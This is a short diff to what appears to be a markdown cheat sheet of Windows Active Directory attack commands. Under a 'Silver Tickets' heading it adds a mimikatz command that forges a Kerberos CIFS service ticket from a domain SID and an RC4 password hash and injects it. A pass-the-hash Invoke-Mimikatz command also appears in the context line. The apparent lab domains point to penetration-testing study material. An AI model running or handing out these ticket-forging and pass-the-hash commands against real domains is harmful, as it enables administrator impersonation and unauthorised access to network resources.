@@ -21,6 +21,8 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:ninja.corp 
 
 ### Silver Tickets  
 ```
+mimikatz kerberos::golden /user:Administrator /domain:cyberbotic.io /sid:S-1-5-21-3865823697-1816233505-1834004910 /target:dc-1.cyberbotic.io /service:cifs /rc4:ac548f25225b5e0974a79a59fc27fc2c /ptt
+
 |kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /target:ninja.corp  /rc4:47b1d9d581f29b3b43845692bd4a0322 /service:cifs /ptt
 ```
 ```
